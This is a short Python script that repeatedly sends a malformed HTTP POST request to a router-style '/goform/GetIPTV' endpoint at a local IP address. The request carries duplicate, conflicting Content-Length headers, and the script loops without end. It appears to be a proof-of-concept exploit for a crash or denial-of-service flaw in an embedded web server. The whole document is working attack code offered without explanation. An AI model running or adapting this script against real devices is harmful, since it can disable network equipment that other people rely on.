import socket

host = "192.168.1.100"
port = 80
times = 0
while 1:
    times += 1
    print("times:"+str(times))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    request = (
        "POST /goform/GetIPTV?fgHPOST/goform/SysToo HTTP/1.1\r\n"
        "Content-Length:1\r\n"
        "Content-Length:# \r\n"
        "\r\n"
    )
    s.send(request.encode())
    response = s.recv(4096)
    print(response.decode())
    s.close()

